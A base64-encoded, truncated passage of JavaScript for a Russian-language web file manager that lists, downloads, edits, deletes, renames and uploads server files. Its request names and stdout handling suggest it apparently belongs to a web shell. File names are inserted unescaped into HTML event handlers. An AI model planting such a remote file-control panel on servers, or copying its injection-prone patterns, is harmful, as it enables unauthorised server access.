ICAgICAgICAgICAgICAgICAgICAvLyDQodC90LDRh9Cw0LvQsCDQtNC40YDQtdC60YLQvtGA0LjQuCwg0L/QvtGC0L7QvCDRhNCw0LnQu9GLCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhLnR5cGUgPT09ICdkaXInICYmIGIudHlwZSAhPT0gJ2RpcicpIHJldHVybiAtMTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGEudHlwZSAhPT0gJ2RpcicgJiYgYi50eXBlID09PSAnZGlyJykgcmV0dXJuIDE7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vINCX0LDRgtC10Lwg0L/QviDQuNC80LXQvdC4CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhLm5hbWUubG9jYWxlQ29tcGFyZShiLm5hbWUpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlLmZpbGVzLmZvckVhY2goZmlsZSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBzaXplID0gZmlsZS50eXBlID09PSAnZGlyJyA/ICctJyA6IGZvcm1hdFNpemUoZmlsZS5zaXplKTsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGRhdGUgPSBuZXcgRGF0ZShmaWxlLm10aW1lICogMTAwMCkudG9Mb2NhbGVTdHJpbmcoKTsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHR5cGVDbGFzcyA9IGZpbGUudHlwZSA9PT0gJ2RpcicgPyAnZGlyJyA6ICdmaWxlJzsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOwogICAgICAgICAgICAgICAgICAgICAgICByb3cub25kYmxjbGljayA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGZpbGUudHlwZSA9PT0gJ2RpcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGTV9DV0QgPSBub3JtYWxpemVQYXRoKEZNX0NXRCArICcvJyArIGZpbGUubmFtZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZEZpbGVMaXN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvd25sb2FkRmlsZShmaWxlLm5hbWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgICAgICByb3cub25jbGljayA9IGZ1bmN0aW9uKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZS50YXJnZXQuY2xhc3NMaXN0LmNvbnRhaW5zKCdhY3Rpb24tYnRuJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxlY3RSb3codGhpcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZWN0ZWRGaWxlID0gZmlsZS5uYW1lOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgcm93LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iJHt0eXBlQ2xhc3N9Ij4ke2ZpbGUubmFtZX0ke2ZpbGUudHlwZSA9PT0gJ2RpcicgPyAnLycgOiAnJ308L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxzcGFuIGNsYXNzPSJzaXplLWJhZGdlIj4ke3NpemV9PC9zcGFuPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PHNwYW4gY2xhc3M9InBlcm1zLWJhZGdlIj4ke2ZpbGUucGVybXN9PC9zcGFuPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+JHtkYXRlfTwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmlsZS1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHtmaWxlLnR5cGUgPT09ICdkaXInID8gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgPGJ1dHRvbiBjbGFzcz0iYWN0aW9uLWJ0biIgb25jbGljaz0iRk1fQ1dEPW5vcm1hbGl6ZVBhdGgoJyR7Rk1fQ1dEfS8ke2ZpbGUubmFtZX0nKTtsb2FkRmlsZUxpc3QoKTsiPtCe0YLQutGA0YvRgtGMPC9idXR0b24+YCA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgPGJ1dHRvbiBjbGFzcz0iYWN0aW9uLWJ0biBkb3dubG9hZCIgb25jbGljaz0iZG93bmxvYWRGaWxlKCcke2ZpbGUubmFtZX0nKSI+0KHQutCw0YfQsNGC0Yw8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJhY3Rpb24tYnRuIGVkaXQiIG9uY2xpY2s9ImVkaXRGaWxlKCcke2ZpbGUubmFtZX0nKSI+0KDQtdC00LDQutGCLjwvYnV0dG9uPmAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJhY3Rpb24tYnRuIiBvbmNsaWNrPSJzaG93UmVuYW1lTW9kYWwoJyR7ZmlsZS5uYW1lfScpIj7Qn9C10YDQtdC40LzQtdC9LjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJhY3Rpb24tYnRuIGRlbGV0ZSIgb25jbGljaz0iZGVsZXRlRmlsZSgnJHtmaWxlLm5hbWV9JykiPtCj0LTQsNC70LjRgtGMPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgICAgICBgOwogICAgICAgICAgICAgICAgICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICB2YXIgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsKICAgICAgICAgICAgICAgICAgICByb3cuaW5uZXJIVE1MID0gJzx0ZCBjb2xzcGFuPSI1IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzoyMHB4OyI+0J/QsNC/0LrQsCDQv9GD0YHRgtCwPC90ZD4nOwogICAgICAgICAgICAgICAgICAgIHRib2R5LmFwcGVuZENoaWxkKHJvdyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gbm9ybWFsaXplUGF0aChwYXRoKSB7CiAgICAgICAgICAgIC8vINCj0LTQsNC70Y/QtdC8INC00LLQvtC50L3Ri9C1INGB0LvRjdGI0LgKICAgICAgICAgICAgcGF0aCA9IHBhdGgucmVwbGFjZSgvXC8rL2csICcvJyk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQntCx0YDQsNCx0LDRgtGL0LLQsNC10Lwg0YLQvtGH0LrQuAogICAgICAgICAgICB2YXIgcGFydHMgPSBwYXRoLnNwbGl0KCcvJyk7CiAgICAgICAgICAgIHZhciByZXN1bHQgPSBbXTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgcGFydHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgIGlmIChwYXJ0c1tpXSA9PT0gJycgfHwgcGFydHNbaV0gPT09ICcuJykgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKHBhcnRzW2ldID09PSAnLi4nKSB7CiAgICAgICAgICAgICAgICAgICAgcmVzdWx0LnBvcCgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICByZXN1bHQucHVzaChwYXJ0c1tpXSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiAnLycgKyByZXN1bHQuam9pbignLycpOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZ2V0UGFyZW50RGlyZWN0b3J5KHBhdGgpIHsKICAgICAgICAgICAgaWYgKCFwYXRoIHx8IHBhdGggPT09ICcvJyB8fCBwYXRoID09PSAnLicpIHJldHVybiAnLyc7CiAgICAgICAgICAgIHZhciBwYXJ0cyA9IHBhdGguc3BsaXQoJy8nKS5maWx0ZXIocCA9PiBwKTsKICAgICAgICAgICAgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMCkgcmV0dXJuICcvJzsKICAgICAgICAgICAgcGFydHMucG9wKCk7CiAgICAgICAgICAgIHJldHVybiBwYXJ0cy5sZW5ndGggPT09IDAgPyAnLycgOiAnLycgKyBwYXJ0cy5qb2luKCcvJyk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBzZWxlY3RSb3cocm93KSB7CiAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5mbS10YWJsZSB0cicpLmZvckVhY2gociA9PiByLmNsYXNzTGlzdC5yZW1vdmUoJ3NlbGVjdGVkJykpOwogICAgICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgnc2VsZWN0ZWQnKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZtR29VcCgpIHsKICAgICAgICAgICAgaWYgKEZNX0NXRCAmJiBGTV9DV0QgIT09ICcvJykgewogICAgICAgICAgICAgICAgRk1fQ1dEID0gZ2V0UGFyZW50RGlyZWN0b3J5KEZNX0NXRCk7CiAgICAgICAgICAgICAgICBsb2FkRmlsZUxpc3QoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZm1SZWZyZXNoKCkgewogICAgICAgICAgICBsb2FkRmlsZUxpc3QoKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGRvd25sb2FkRmlsZShmaWxlbmFtZSkgewogICAgICAgICAgICB2YXIgcGF0aCA9IEZNX0NXRCA9PT0gJy8nID8gZmlsZW5hbWUgOiBGTV9DV0QgKyAnLycgKyBmaWxlbmFtZTsKICAgICAgICAgICAgLy8g0J/RgNGP0LzQvtC1INGB0LrQsNGH0LjQstCw0L3QuNC1INGH0LXRgNC10LcgR0VUCiAgICAgICAgICAgIHdpbmRvdy5vcGVuKCc/ZmVhdHVyZT1kb3dubG9hZCZmaWxlPScgKyBlbmNvZGVVUklDb21wb25lbnQocGF0aCksICdfYmxhbmsnKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGVkaXRGaWxlKGZpbGVuYW1lKSB7CiAgICAgICAgICAgIHZhciBwYXRoID0gRk1fQ1dEID09PSAnLycgPyBmaWxlbmFtZSA6IEZNX0NXRCArICcvJyArIGZpbGVuYW1lOwogICAgICAgICAgICAKICAgICAgICAgICAgbWFrZVJlcXVlc3QoIj9mZWF0dXJlPWZpbGVyZWFkIiwge3BhdGg6IHBhdGh9LCBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLmVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgYWxlcnQoJ9Ce0YjQuNCx0LrQsDogJyArIHJlc3BvbnNlLmVycm9yKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlZGl0RmlsZU5hbWUnKS52YWx1ZSA9IGZpbGVuYW1lOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAvLyDQn9GA0L7QsdGD0LXQvCDQtNC10LrQvtC00LjRgNC+0LLQsNGC0Ywg0LrQsNC6IFVURi04CiAgICAgICAgICAgICAgICAgICAgdmFyIGNvbnRlbnQgPSBhdG9iKHJlc3BvbnNlLmNvbnRlbnQpOwogICAgICAgICAgICAgICAgICAgIC8vINCV0YHQu9C4INGN0YLQviDQsdC40L3QsNGA0L3Ri9C1INC00LDQvdC90YvQtSwg0L/QvtC60LDQt9GL0LLQsNC10Lwg0LrQsNC6IGhleAogICAgICAgICAgICAgICAgICAgIGlmICghaXNWYWxpZFVURjgoY29udGVudCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2VkaXRGaWxlQ29udGVudCcpLnZhbHVlID0gIkJpbmFyeSBmaWxlIC0gY2Fubm90IGVkaXRcblNpemU6ICIgKyBjb250ZW50Lmxlbmd0aCArICIgYnl0ZXMiOwogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZWRpdEZpbGVDb250ZW50JykucmVhZE9ubHkgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlZGl0RmlsZUNvbnRlbnQnKS52YWx1ZSA9IGNvbnRlbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlZGl0RmlsZUNvbnRlbnQnKS5yZWFkT25seSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlZGl0RmlsZUNvbnRlbnQnKS52YWx1ZSA9ICJFcnJvciBkZWNvZGluZyBmaWxlOiAiICsgZS5tZXNzYWdlOwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlZGl0RmlsZUNvbnRlbnQnKS5yZWFkT25seSA9IHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBzaG93TW9kYWwoJ2VkaXRGaWxlJyk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBmdW5jdGlvbiBpc1ZhbGlkVVRGOChzdHIpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGRlY29kZVVSSUNvbXBvbmVudChlc2NhcGUoc3RyKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIHNhdmVGaWxlKCkgewogICAgICAgICAgICB2YXIgZmlsZW5hbWUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZWRpdEZpbGVOYW1lJykudmFsdWU7CiAgICAgICAgICAgIHZhciBjb250ZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2VkaXRGaWxlQ29udGVudCcpLnZhbHVlOwogICAgICAgICAgICB2YXIgcGF0aCA9IEZNX0NXRCA9PT0gJy8nID8gZmlsZW5hbWUgOiBGTV9DV0QgKyAnLycgKyBmaWxlbmFtZTsKICAgICAgICAgICAgCiAgICAgICAgICAgIG1ha2VSZXF1ZXN0KCI/ZmVhdHVyZT1maWxlZWRpdCIsIHsKICAgICAgICAgICAgICAgIHBhdGg6IHBhdGgsCiAgICAgICAgICAgICAgICBjb250ZW50OiBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChjb250ZW50KSkpCiAgICAgICAgICAgIH0sIGZ1bmN0aW9uKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uuc3VjY2VzcykgewogICAgICAgICAgICAgICAgICAgIGhpZGVNb2RhbCgnZWRpdEZpbGUnKTsKICAgICAgICAgICAgICAgICAgICBhbGVydCgn0KTQsNC50Lsg0YHQvtGF0YDQsNC90LXQvScpOwogICAgICAgICAgICAgICAgICAgIGxvYWRGaWxlTGlzdCgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBhbGVydCgn0J7RiNC40LHQutCwINGB0L7RhdGA0LDQvdC10L3QuNGPINGE0LDQudC70LAnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBkZWxldGVGaWxlKGZpbGVuYW1lKSB7CiAgICAgICAgICAgIGlmICghY29uZmlybSgn0KPQtNCw0LvQuNGC0YwgIicgKyBmaWxlbmFtZSArICciPycpKSByZXR1cm47CiAgICAgICAgICAgIAogICAgICAgICAgICB2YXIgcGF0aCA9IEZNX0NXRCA9PT0gJy8nID8gZmlsZW5hbWUgOiBGTV9DV0QgKyAnLycgKyBmaWxlbmFtZTsKICAgICAgICAgICAgCiAgICAgICAgICAgIG1ha2VSZXF1ZXN0KCI/ZmVhdHVyZT1maWxlZGVsZXRlIiwge3BhdGg6IHBhdGh9LCBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLnN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICBsb2FkRmlsZUxpc3QoKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgYWxlcnQoJ9Ce0YjQuNCx0LrQsCDRg9C00LDQu9C10L3QuNGPJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gc2hvd1JlbmFtZU1vZGFsKGZpbGVuYW1lKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZW5hbWVPbGQnKS52YWx1ZSA9IGZpbGVuYW1lOwogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVuYW1lTmV3JykudmFsdWUgPSAnJzsKICAgICAgICAgICAgc2hvd01vZGFsKCdyZW5hbWUnKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIHJlbmFtZUZpbGUoKSB7CiAgICAgICAgICAgIHZhciBvbGROYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlbmFtZU9sZCcpLnZhbHVlOwogICAgICAgICAgICB2YXIgbmV3TmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZW5hbWVOZXcnKS52YWx1ZTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICghbmV3TmFtZSkgewogICAgICAgICAgICAgICAgYWxlcnQoJ9CS0LLQtdC00LjRgtC1INC90L7QstC+0LUg0LjQvNGPJyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHZhciBvbGRQYXRoID0gRk1fQ1dEID09PSAnLycgPyBvbGROYW1lIDogRk1fQ1dEICsgJy8nICsgb2xkTmFtZTsKICAgICAgICAgICAgdmFyIG5ld1BhdGggPSBGTV9DV0QgPT09ICcvJyA/IG5ld05hbWUgOiBGTV9DV0QgKyAnLycgKyBuZXdOYW1lOwogICAgICAgICAgICAKICAgICAgICAgICAgbWFrZVJlcXVlc3QoIj9mZWF0dXJlPWZpbGVyZW5hbWUiLCB7b2xkOiBvbGRQYXRoLCBuZXc6IG5ld1BhdGh9LCBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLnN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICBoaWRlTW9kYWwoJ3JlbmFtZScpOwogICAgICAgICAgICAgICAgICAgIGxvYWRGaWxlTGlzdCgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBhbGVydCgn0J7RiNC40LHQutCwINC/0LXRgNC10LjQvNC10L3QvtCy0LDQvdC40Y8nKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBjcmVhdGVGaWxlKCkgewogICAgICAgICAgICB2YXIgbmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCduZXdGaWxlTmFtZScpLnZhbHVlOwogICAgICAgICAgICBpZiAoIW5hbWUpIHsKICAgICAgICAgICAgICAgIGFsZXJ0KCfQktCy0LXQtNC40YLQtSDQuNC80Y8g0YTQsNC50LvQsCcpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICB2YXIgcGF0aCA9IEZNX0NXRCA9PT0gJy8nID8gbmFtZSA6IEZNX0NXRCArICcvJyArIG5hbWU7CiAgICAgICAgICAgIAogICAgICAgICAgICBtYWtlUmVxdWVzdCgiP2ZlYXR1cmU9ZmlsZWNyZWF0ZSIsIHtwYXRoOiBwYXRofSwgZnVuY3Rpb24ocmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5zdWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgaGlkZU1vZGFsKCdjcmVhdGVGaWxlJyk7CiAgICAgICAgICAgICAgICAgICAgbG9hZEZpbGVMaXN0KCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCfQntGI0LjQsdC60LAg0YHQvtC30LTQsNC90LjRjyDRhNCw0LnQu9CwJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gY3JlYXRlRGlyKCkgewogICAgICAgICAgICB2YXIgbmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCduZXdEaXJOYW1lJykudmFsdWU7CiAgICAgICAgICAgIGlmICghbmFtZSkgewogICAgICAgICAgICAgICAgYWxlcnQoJ9CS0LLQtdC00LjRgtC1INC40LzRjyDQv9Cw0L/QutC4Jyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHZhciBwYXRoID0gRk1fQ1dEID09PSAnLycgPyBuYW1lIDogRk1fQ1dEICsgJy8nICsgbmFtZTsKICAgICAgICAgICAgCiAgICAgICAgICAgIG1ha2VSZXF1ZXN0KCI/ZmVhdHVyZT1kaXJjcmVhdGUiLCB7cGF0aDogcGF0aH0sIGZ1bmN0aW9uKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uuc3VjY2VzcykgewogICAgICAgICAgICAgICAgICAgIGhpZGVNb2RhbCgnY3JlYXRlRGlyJyk7CiAgICAgICAgICAgICAgICAgICAgbG9hZEZpbGVMaXN0KCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCfQntGI0LjQsdC60LAg0YHQvtC30LTQsNC90LjRjyDQv9Cw0L/QutC4Jyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gdXBsb2FkRmlsZSgpIHsKICAgICAgICAgICAgdmFyIGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlVG9VcGxvYWQnKTsKICAgICAgICAgICAgdmFyIHBhdGhJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1cGxvYWRQYXRoJykudmFsdWU7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoIWZpbGVJbnB1dC5maWxlc1swXSkgewogICAgICAgICAgICAgICAgYWxlcnQoJ9CS0YvQsdC10YDQuNGC0LUg0YTQsNC50Lsg0LTQu9GPINC30LDQs9GA0YPQt9C60LgnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgdmFyIHJlYWRlciA9IG5ldyBGaWxlUmVhZGVyKCk7CiAgICAgICAgICAgIHJlYWRlci5vbmxvYWQgPSBmdW5jdGlvbihlKSB7CiAgICAgICAgICAgICAgICB2YXIgYmFzZTY0ID0gZS50YXJnZXQucmVzdWx0LnNwbGl0KCcsJylbMV07CiAgICAgICAgICAgICAgICB2YXIgZmlsZW5hbWUgPSBmaWxlSW5wdXQuZmlsZXNbMF0ubmFtZTsKICAgICAgICAgICAgICAgIHZhciB1cGxvYWRQYXRoID0gcGF0aElucHV0IHx8IChGTV9DV0QgPT09ICcvJyA/IGZpbGVuYW1lIDogRk1fQ1dEICsgJy8nICsgZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBtYWtlUmVxdWVzdCgiP2ZlYXR1cmU9dXBsb2FkIiwgewogICAgICAgICAgICAgICAgICAgIHBhdGg6IHVwbG9hZFBhdGgsCiAgICAgICAgICAgICAgICAgICAgZmlsZTogYmFzZTY0LAogICAgICAgICAgICAgICAgICAgIGN3ZDogRk1fQ1dECiAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihyZXNwb25zZSkgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5zdGRvdXQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaGlkZU1vZGFsKCd1cGxvYWQnKTsKICAgICAgICAgICAgICAgICAgICAgICAgbG9hZEZpbGVMaXN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGFsZXJ0KCfQpNCw0LnQuyDQt9Cw0LPRgNGD0LbQtdC9Jyk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoJ9Ce0YjQuNCx0LrQsCDQt9Cw0LPRgNGD0LfQutC4Jyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIHJlYWRlci5yZWFkQXNEYXRhVVJMKGZpbGVJbnB1dC5maWxlc1swXSk7CiAgICAgICAgfQoKICAgICAgICAvLyA9PT09PT09PT09PT09PT09PT09PSDQo9Ci0JjQm9CY0KLQqyA9PT09PT09PT09PT09PT09PT09PQogICAgICAgIAogICAgICAgIGZ1bmN0aW9uIHNob3dNb2RhbCh0eXBlKSB7CiAgICAgICAgICAgIGN1cnJlbnRNb2RhbCA9IHR5cGUgKyAnTW9kYWwnOwogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChjdXJyZW50TW9kYWwpLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBoaWRlTW9kYWwodHlwZSkgewogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCh0eXBlICsgJ01vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKICAgICAgICAgICAgY3VycmVudE1vZGFsID0gbnVsbDsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vINCe0YfQuNGJ0LDQtdC8INC/0L7Qu9GPCiAgICAgICAgICAgIGlmICh0eXBlID09PSAndXBsb2FkJykgewogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVUb1VwbG9hZCcpLnZhbHVlID0gJyc7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXBsb2FkUGF0aCcpLnZhbHVlID0gJyc7CiAgICAgICAgICAgIH0gZWxzZSBpZiAodHlwZSA9PT0gJ2NyZWF0ZUZpbGUnKSB7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmV3RmlsZU5hbWUnKS52YWx1ZSA9ICcnOwogICAgICAgICAgICB9IGVsc2UgaWYgKHR5cGUgPT09ICdjcmVhdGVEaXInKSB7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmV3RGlyTmFtZScpLnZhbHVlID0gJyc7CiAgICAgICAgICAgIH0gZWxzZSBpZiAodHlwZSA9PT0gJ2VkaXRGaWxlJykgewogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2VkaXRGaWxlTmFtZScpLnZhbHVlID0gJyc7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZWRpdEZpbGVDb250ZW50JykudmFsdWUgPSAnJzsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlZGl0RmlsZUNvbnRlbnQnKS5yZWFkT25seSA9IGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmb3JtYXRTaXplKGJ5dG